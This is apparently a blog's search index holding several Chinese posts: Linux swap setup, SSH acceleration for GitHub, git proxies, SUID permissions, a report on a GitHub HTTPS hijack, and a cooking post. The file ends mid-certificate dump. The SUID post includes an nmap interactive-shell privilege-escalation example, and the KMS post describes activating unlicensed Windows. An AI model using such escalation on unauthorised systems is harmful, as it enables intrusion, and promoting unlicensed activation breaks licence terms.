<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux添加swap</title>
      <link href="/2020/linux-add-swap.html"/>
      <url>/2020/linux-add-swap.html</url>
      
        <content type="html"><![CDATA[<p>给 linux 服务器添加swap做了好几次了，每一次都没记住，临时去网上查命令，这里特地记录一下</p><h2 id="查看当前swap"><a href="#查看当前swap" class="headerlink" title="查看当前swap"></a>查看当前swap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo swapon --show</span><br></pre></td></tr></table></figure><p>如果没有输出说明没有swap</p><p>也可以通过free命令来查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free -h</span><br></pre></td></tr></table></figure><h2 id="添加swap"><a href="#添加swap" class="headerlink" title="添加swap"></a>添加swap</h2><p>添加swap基本步骤： 创建一个大文件 -&gt; 初始化文件为swap交换文件格式 -&gt; 启用这个文件</p><h3 id="创建大文件"><a href="#创建大文件" class="headerlink" title="创建大文件"></a>创建大文件</h3><p>先找一个剩余空间大点的地方创建一个大文件，这里以1G的大小为例，一般swap空间大小以真实物理内存1-2倍大小</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我喜欢用的方法，速度快</span></span><br><span class="line">sudo fallocate -l 1G /swapfile</span><br><span class="line"><span class="comment"># 如果没有安装可以用dd命令，比较慢</span></span><br><span class="line">sudo dd <span class="keyword">if</span>=/dev/zero of=/swapfile bs=1024 count=1048576</span><br></pre></td></tr></table></figure><p>修改文件的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 600 /swapfile</span><br></pre></td></tr></table></figure><h3 id="初始化文件"><a href="#初始化文件" class="headerlink" title="初始化文件"></a>初始化文件</h3><p>创建完文件后需要将文件进行初始化，标记为swap文件格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkswap /swapfile</span><br></pre></td></tr></table></figure><h3 id="启用swap"><a href="#启用swap" class="headerlink" title="启用swap"></a>启用swap</h3><p>接下来使用 命令启用这个swap交换文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo swapon /swapfile</span><br></pre></td></tr></table></figure><p>要让创建好的 swap 分区永久生效，可以将 swapfile 路径内容写入到 <code>/etc/fstab</code> 文件当中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/swapfile swap swap defaults 0 0</span><br></pre></td></tr></table></figure><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>用一开始的命令检查一下swap是否启用正常</p><h2 id="移除SWAP分区"><a href="#移除SWAP分区" class="headerlink" title="移除SWAP分区"></a>移除SWAP分区</h2><p>根据添加的顺序反着来就行： 取消swap -&gt; 删除swap分页文件</p><h3 id="取消swap"><a href="#取消swap" class="headerlink" title="取消swap"></a>取消swap</h3><p>首先输入以下命令停用 SWAP 空间：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo swapoff -v /swapfile</span><br></pre></td></tr></table></figure><p>在 <code>/etc/fstab</code> 文件中删除有效 swap 的行。</p><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>最后执行以下命令删除 swapfile 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /swapfile</span><br></pre></td></tr></table></figure><h2 id="调整Swappiness值"><a href="#调整Swappiness值" class="headerlink" title="调整Swappiness值"></a>调整Swappiness值</h2><p>Swappiness 是一个 Linux 内核属性，用于定义 Linux 系统使用 SWAP 空间的频率。Swappiness 值可以从 0 至 100，较低的值会让内核尽可能少的使用 SWAP 空间，而较高的值将让 Linux Kernel 能够更加积极地使用 SWAP 分区。</p><p>Ubuntu 18.04 默认的 Swappiness 值为 60，您可以使用如下命令来查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/swappiness</span><br></pre></td></tr></table></figure><p>值为 60 对于 Ubuntu 18.04 桌面还算行，但对于 Ubuntu Server 来说，SWAP 的使用频率就比较高了，所以您可能需要设置较低的值。例如，要将 swappiness 值设置为 40，请执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl vm.swappiness=40</span><br></pre></td></tr></table></figure><p>如果要让设置在系统重启后依然有效，则必要在 /etc/sysctl.conf 文件中添加以下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.swappiness=40</span><br></pre></td></tr></table></figure><p>最佳 swappiness 值取决于您系统的工作负载以及内存的使用方式，您应该以小增量的方式来调整此参数，以查到最佳值。</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> swap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用GlobalSSH服务加速境外服务器ssh访问</title>
      <link href="/2020/use-ucloud-globalssh-to-speedup-server-ssh.html"/>
      <url>/2020/use-ucloud-globalssh-to-speedup-server-ssh.html</url>
      
        <content type="html"><![CDATA[<p>由于众所周知的原因，很多国外的服务器在国内的访问效果很差，特别是国内比较热门的廉价服务器例如 Vultr 就经常被墙直接无法访问</p><p>通常情况下我会使用ssr等代理服务进行中转，在我经常使用的 MobaXterm 中设置起来也非常方便</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/use-ucloud-globalssh-to-speedup-server-ssh/mobaxterm-socks-http.jpg" loading="lazy" class="" title="[给连接设置代理]"><p>但是这种方法有两大劣势：</p><ol><li>如果科学上网服务器不稳定经常断流就会导致ssh连接断开</li><li>部分客户端不支持设置http或者socks代理</li></ol><h2 id="GlobalSSH"><a href="#GlobalSSH" class="headerlink" title="GlobalSSH"></a>GlobalSSH</h2><p>今天发现了一个免费的加速服务，非常方便，推荐给需要的人</p><p>这就是 UCloud 免费提供的 GlobalSSH 加速服务</p><p>官网链接： <a href="https://console.ucloud.cn/upathx/globalssh" target="_blank" rel="noopener">https://console.ucloud.cn/upathx/globalssh</a></p><p>官方文档： <a href="https://docs.ucloud.cn/pathx/globalssh" target="_blank" rel="noopener">https://docs.ucloud.cn/pathx/globalssh</a></p><p>这项服务目前是免费的，<del>也不需要进行实名认证</del> 现在需要实名认证才能用了，可以说是非常良心了，经过我的试用，访问速度和稳定性非常不错</p><p>支持ssh和rdp远程桌面，猜测有一些其他的服务可以加速，因为是针对端口加速的，但是如果滥用的话可能被封禁</p><p>在创建的时候只需要输入需要加速的国外服务器的ip和服务端口号，选择一个离服务器近的接入点</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/use-ucloud-globalssh-to-speedup-server-ssh/position.jpg" loading="lazy" class="" title="[多个出口位置]"><p>创建之后会提供一个域名，可以将自己的域名CNAME解析到提供的域名上方便记忆，UCLOUD可以准确识别到是访问哪一台服务器</p><p>在我们使用的客户端上只需要用提供的加速域名和原服务端口号就可以了</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>自产品实例创建之日起，7日内单个实例累计出向流量小于2MB，加速功能将被停用，所以一开始先多用点吧</li><li>每个源IP只能加速一个端口</li><li>加速流量上限官方未注明，滥用的话会被封</li></ol><h2 id="妙用"><a href="#妙用" class="headerlink" title="妙用"></a>妙用</h2><p>众所周知，github在国内的访问速度很慢，有时候clone一个库不得不忍受十几k几十k每秒的速度</p><p>而git是可以用ssh协议的，所以我们只需要从 <a href="https://api.github.com/meta" target="_blank" rel="noopener">https://api.github.com/meta</a> 找到github使用的ip，通过GlobalSSH加速22端口，然后将自己的域名解析到加速的ip，最后使用自己的域名clone就行了</p><p>经过我的尝试效果还不错，可以跑到10Mbps</p><p>我用的域名为 <code>githubssh.xyz</code> ，大家可以拿去用，使用方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原命令</span><br><span class="line">git <span class="built_in">clone</span> git@github.com:moby/moby.git</span><br><span class="line"></span><br><span class="line">替换后</span><br><span class="line">git <span class="built_in">clone</span> git@githubssh.xyz:moby/moby.git</span><br></pre></td></tr></table></figure><p>为了能够自动更新ip，我写了一个程序，每天会检查github新的ip，创建新的globalssh，然后自动解析到域名githubssh.xyz上，由cloudflare进行DNS层面的负载均衡</p><p>开源地址为： <a href="https://github.com/zu1k/globalssh4github" target="_blank" rel="noopener">https://github.com/zu1k/globalssh4github</a></p><p>同时为了方便，改了一个插件： <a href="https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo</a></p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> coding </tag>
            
            <tag> ucloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kms激活</title>
      <link href="/2020/kms.html"/>
      <url>/2020/kms.html</url>
      
        <content type="html"><![CDATA[<p>这是一个无聊的，老生常谈的话题</p><p>我个人笔记本是自带的正版windows，但是在虚拟机里面的win却没有正版，我一般会用kms进行激活</p><p>github搜索kms会找到很多版本的kms激活服务端，比较出名的是这一个，可以一键运行起来：<a href="https://github.com/Wind4/vlmcsd" target="_blank" rel="noopener">https://github.com/Wind4/vlmcsd</a></p><p>相关的脚本啊，命令啊，在百度一搜一大堆，就不重复写了</p><p>分享一点我想说的，我的做法把用自己的域名cname解析网上搜到的kms服务器地址，然后用自己的域名进行激活。</p><p>因为你永远不知道他们提供的服务什么时候会中止或者域名什么时候会到期，像我这样有多个不同的虚拟机，如果这种事情发生我就需要打开每一个虚拟机分别重新运行激活脚本进行重新激活，这就很麻烦。</p><p>而用自己的域名的话，我只需要找一个好用的kms服务器然后修改dns的解析就行了，省了很多事</p><p>我自己用的激活脚本： <a href="https://gist.github.com/zu1k/612dd4b0a0193620d43c08a698e05d85" target="_blank" rel="noopener">https://gist.github.com/zu1k/612dd4b0a0193620d43c08a698e05d85</a></p>]]></content>
      
      
      <categories>
          
          <category> share </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>烤红薯</title>
      <link href="/2020/bake-sweet-potato.html"/>
      <url>/2020/bake-sweet-potato.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>这应该是我第一篇记录生活的博文吧，之前一直是写一些学习、技术相关的文章，总感觉博客不应该只记录这些东西，那就开始吧</p></blockquote><p>妈妈从网上买了几斤红薯，今天突然说想吃，那就用烤箱烤一下吧</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>烤盘铺上锡纸（哑光面接触食物），红薯洗净不去皮，均匀的摆放到烤盘上</p><p>烤箱230度预热10分钟后就可以将烤盘放入了</p><h2 id="第一波"><a href="#第一波" class="headerlink" title="第一波"></a>第一波</h2><p>230度先烤30分钟，呼叫小爱：“小爱同学，30分钟后叫我”</p><p>30分钟不到（大约20多分钟吧）就闻到红薯的香气飘出来了，香啊</p><p>30分钟后打开烤箱，用夹子夹着给每个红薯翻个个</p><p>烤了半个小时的红薯朝上的那面有点软，但是没有怎么变色，接触锡纸的一面有点变黑了，焦感出来了</p><p>翻完个后拍了三张照片，可以看到整体还是不错的，火候还不到，有的地方已经流出油来了</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/bake-sweet-potato/ex_1.jpg" loading="lazy" class="" title="[整体]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/bake-sweet-potato/ex_2.jpg" loading="lazy" class="" title="[放大]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/bake-sweet-potato/ex_3.jpg" loading="lazy" class="" title="[有的地方流出来了油]"><h2 id="第二波"><a href="#第二波" class="headerlink" title="第二波"></a>第二波</h2><p>鉴于红薯个比较大，翻个后时间增加到45分钟，接着烤</p><p>中途没忍住，打开拍了一张照片，流了很多油啊，接触到烤盘发出滋滋的响声，很是诱人</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/bake-sweet-potato/ex_4.jpg" loading="lazy" class="" title="[流了很多油]"><h2 id="出炉"><a href="#出炉" class="headerlink" title="出炉"></a>出炉</h2><p>时间到，啥也不说了，直接看图吧</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/bake-sweet-potato/ex_5.jpg" loading="lazy" class="" title="[出炉]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/bake-sweet-potato/ex_6.jpg" loading="lazy" class="" title="[出炉]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/bake-sweet-potato/ex_7.jpg" loading="lazy" class="" title="[出炉]"><p>超级好吃，超级甜，超级香</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>这次因为是第一次烤，烤的时间稍微有点长，流出来太多油浪费了，还有一些油都烤糊了，下次会缩短一点时间</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/bake-sweet-potato/ex_8.jpg" loading="lazy" class="" title="[糊了]">]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cooking </tag>
            
            <tag> sweet potato </tag>
            
            <tag> bake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习Linux中的SUID机制</title>
      <link href="/2020/linux-suid.html"/>
      <url>/2020/linux-suid.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是SUID"><a href="#什么是SUID" class="headerlink" title="什么是SUID"></a>什么是SUID</h2><p>SUID简称位，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权</p><p>同一类的还有SGID，就不详细说了，原理与SUID一样，就以SUID为例</p><p>在一个程序执行的时候会有三个ID状态，在深入学习SUID之前必须能够区分下面三种ID：</p><ul><li>Real User ID</li><li>Effective User ID</li><li>Saved User ID</li></ul><p><code>Real User ID</code> 是执行这个程序的用户的真实ID，是已用户login时候的ID为准</p><p><code>Effective User ID</code> 是程序执行过程中使用权限时真正起作用的用户ID，操作系统在检查一个程序有没有某个权限的时候会看这个ID</p><p><code>Saved User ID</code> 是程序临时提权时需要保存的先前的用户ID，等提权结束后需要回退到这个用户ID</p><h2 id="SUID的作用"><a href="#SUID的作用" class="headerlink" title="SUID的作用"></a>SUID的作用</h2><p>如果用户user2有另一个用户user1的程序的执行权限，并且user1给这个程序设置了SUID位，那么user2就可以用user1的权限来执行这个程序</p><p>简单来说，SUID能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权</p><p>举个例子：</p><p>所有用户的密码保存在 <code>/etc/shadow</code> 文件中，但是这个文件只有root用户能够进行写操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ls -l /etc/shadow</span></span><br><span class="line">-rw-r----- 1 root shadow 1639 Jan 27 12:50 /etc/shadow</span><br></pre></td></tr></table></figure><p>那如果普通用户想要修改自己的密码，是否需要让root用户帮着修改呢？</p><p>显然不需要，修改密码用到了 <code>/usr/bin/passwd</code> 这个程序，我们来看一下它的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ls -l /usr/bin/passwd</span></span><br><span class="line">-rwsr-xr-x 1 root root 63944 Dec 20 10:39 /usr/bin/passwd</span><br></pre></td></tr></table></figure><p>可以看到，这个程序的所有者是root用户，但是所有用户都有执行权限，并且设置了s位（怎么看出来的后面会说）</p><p>这样SUID机制就会在程序执行的时候发生作用，让普通用户可以用root权限修改<code>/etc/shadow</code>文件</p><p>SUID机制的存在使程序权限的控制更加方便，用户可以执行某个程序而不需要登录到程序拥有者的账号</p><h2 id="如何使用SUID"><a href="#如何使用SUID" class="headerlink" title="如何使用SUID"></a>如何使用SUID</h2><h3 id="查看SUID"><a href="#查看SUID" class="headerlink" title="查看SUID"></a>查看SUID</h3><p>通过命令 <code>ls -l</code> 即可看到文件的详细信息，包括权限表 <code>-rwxrwxrwx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-   rwx   rwx   rwx</span><br><span class="line"></span><br><span class="line">第一位是文件类型，-就是普通文件，d代表目录，l代表链接文件，还有一些其他类型的文件不详细说了</span><br><span class="line"></span><br><span class="line">后面的9位可以分成三组，分别表示所有者权限、同组内用户权限，组外其他用户权限</span><br><span class="line"></span><br><span class="line">每一组都有三位，r 代表有读取权限，w 代表有写入权限，x 代表有执行权限，如果是 _ 就代表没有相应的权限</span><br><span class="line"></span><br><span class="line">如果文件所有者权限的 x 换成 s 就代表设置了SUID</span><br><span class="line"></span><br><span class="line">同理如果组内用户权限的 x 换成了 s 就代表设置了SGID</span><br></pre></td></tr></table></figure><h3 id="设置SUID"><a href="#设置SUID" class="headerlink" title="设置SUID"></a>设置SUID</h3><p>使用 <code>chmod 4000 filename</code> 可以设置SUID位</p><p>使用 <code>chmod 2000 filename</code> 可以设置SGID位</p><p>使用 <code>chmod 6000 filename</code> 可以同时设置SGID和SUID位</p><blockquote><p>注意: 2000\4000\6000都是不完整的权限，正常使用应该将000替换为相应的权限，例如 4755</p></blockquote><h3 id="取消SUID"><a href="#取消SUID" class="headerlink" title="取消SUID"></a>取消SUID</h3><p>使用 <code>chmod 755 filename</code> 可以取消SGID和SUID位</p><p>或者 <code>chmod u-s filename</code> or <code>chmod g-s filename</code> 也可以</p><h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>因为SUID位让程序在执行的时候有了所有者的权限，所以可以利用这点来提权</p><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入nmap的交互模式</span></span><br><span class="line">nmap --interactive</span><br><span class="line"><span class="comment"># 执行sh，提权成功</span></span><br><span class="line">!sh</span><br></pre></td></tr></table></figure><p>详细介绍见： <a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><h2 id="SUID在脚本中失效"><a href="#SUID在脚本中失效" class="headerlink" title="SUID在脚本中失效"></a>SUID在脚本中失效</h2><p>假如user1用 <code>chmod 4777 /home/user1/script.sh</code> 命令给<code>script.sh</code>脚本设置SUID位，登录user2后执行这个脚本提示没有权限</p><p>这是因为SUID位只对编译过的可执行程序起作用，sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的SUID位，那就不会起作用了</p><p>Perl执行器会检查perl脚本的suid位，所以可以给pl脚本设置suid位</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> coding </tag>
            
            <tag> suid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给git设置代理</title>
      <link href="/2020/set-proxy-for-git.html"/>
      <url>/2020/set-proxy-for-git.html</url>
      
        <content type="html"><![CDATA[<p>近期，Github的直连速度一直不理想，甚至被墙或者MITM，最好的解决办法就是挂代理</p><p>Git 可以使用四种不同的协议来传输资料：本地协议（Local），HTTP 协议，SSH（Secure Shell）协议及 Git 协议</p><p>而我们平时使用github一般使用两种协议，一种是http协议，另一种是ssh协议，针对这两种协议有两种不同的代理设置办法</p><h2 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h2><p>通常使用的链接形如：<code>https://github.com/git/git.git</code></p><p>针对这种协议，代理设置比较简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http或https代理</span></span><br><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line">git config --global https.proxy https://127.0.0.1:1080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消代理</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br></pre></td></tr></table></figure><h2 id="ssh协议"><a href="#ssh协议" class="headerlink" title="ssh协议"></a>ssh协议</h2><p>通常使用的链接形如：<code>git@github.com:git/git.git</code> 或者 <code>ssh://[&lt;username&gt;@]&lt;server&gt;[:&lt;port&gt;]/path/repo.git</code></p><p>对于使用ssh协议的库，上面的代理设置办法就失效了，需要给ssh设置socks代理</p><p>在 <code>~/.ssh/config</code> 文件中添加下面内容， 如果没有这个文件就新建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">ProxyCommand nc -X 5 -x 127.0.0.1:1080 %h %p</span><br></pre></td></tr></table></figure><p>这里使用的是nc命令，linux需要安装netcat(一般自带了)，windows需要单独下载</p><p>windows如果安装了<code>mingw</code>也可以使用<code>connect</code>命令来替代<code>nc</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">ProxyCommand connect -S 127.0.0.1:1080 %h %p</span><br></pre></td></tr></table></figure><blockquote><p>补充： 详见 <a href="https://blog.lgf.im/2020/use-ucloud-globalssh-to-speedup-server-ssh.html">https://blog.lgf.im/2020/use-ucloud-globalssh-to-speedup-server-ssh.html</a><br>可以通过 GlobalSSH 的海外加速服务来加速github的访问，经过我的尝试效果还不错，可以跑到10Mbps<br>我用的域名为 <code>zll.us</code> ，大家可以拿去用，使用方法如下：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原命令</span><br><span class="line">git <span class="built_in">clone</span> git@github.com:moby/moby.git</span><br><span class="line"></span><br><span class="line">替换后</span><br><span class="line">git <span class="built_in">clone</span> git@zll.us:moby/moby.git</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> proxy </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github等大面积https劫持</title>
      <link href="/2020/mitm-https-hijack-github.html"/>
      <url>/2020/mitm-https-hijack-github.html</url>
      
        <content type="html"><![CDATA[<p>昨天下午两点多，突然在一个站长群里听到有人说 Github Pages 的证书大批量出现错误，不一会就在V2EX上看到相关讨论的帖子</p><p>当天晚上再次刷V2EX的时候发现部分cloudflare的IP和京东主站部分IP也出现相似的劫持事件</p><p>今天早晨8点左右，在V2EX上发现有人讨论 Github 主站出现相同的https劫持，不经过代理访问发现证书的确异常</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/mitm-https-hijack-github/github-cert-warn.jpg" loading="lazy" class="" title="[Github证书异常警告]"><p>查看证书详情</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/mitm-https-hijack-github/fake-cert-ca.jpg" loading="lazy" class="" title="[假CA证书]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/mitm-https-hijack-github/fake-cert-2.jpg" loading="lazy" class="" title="[假证书]"><h2 id="检查Github证书"><a href="#检查Github证书" class="headerlink" title="检查Github证书"></a>检查Github证书</h2><p>这里我通过北京和香港两台阿里云主机，使用openssl提供的方法查看证书详细内容</p><p>命令为: <code>openssl s_client -showcerts -connect github.com:443 &lt; /dev/null</code></p><h3 id="北京阿里云"><a href="#北京阿里云" class="headerlink" title="北京阿里云"></a>北京阿里云</h3><details>  <summary>点击展开</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openssl s_client -showcerts -connect github.com:443 &lt; /dev/null</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=1 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">verify error:num=19:self signed certificate <span class="keyword">in</span> certificate chain</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=1 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=0 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com</span><br><span class="line">   i:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIB4TCCAYcCFDjGwZUOfrr1+SWHR5GxJ/rwXsHZMAoGCCqGSM49BAMCMHExCzAJ</span><br><span class="line">BgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoMA0NP</span><br><span class="line">TTEMMAoGA1UECwwDTlNQMQswCQYDVQQDDAJDQTEfMB0GCSqGSIb3DQEJARYQMzQ2</span><br><span class="line">NjA4NDUzQHFxLmNvbTAeFw0xOTA5MjYwOTMzMTNaFw0yOTA5MjMwOTMzMTNaMHUx</span><br><span class="line">CzAJBgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoM</span><br><span class="line">A0NPTTEMMAoGA1UECwwDTlNQMQ8wDQYDVQQDDAZTRVJWRVIxHzAdBgkqhkiG9w0B</span><br><span class="line">CQEWEDM0NjYwODQ1M0BxcS5jb20wWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAASJ</span><br><span class="line">27aMaVclvmdT8m6l98K999FM4dYTg4ag0627S2bxbLYHyLdQ0jqay5kA9KCF9Ucw</span><br><span 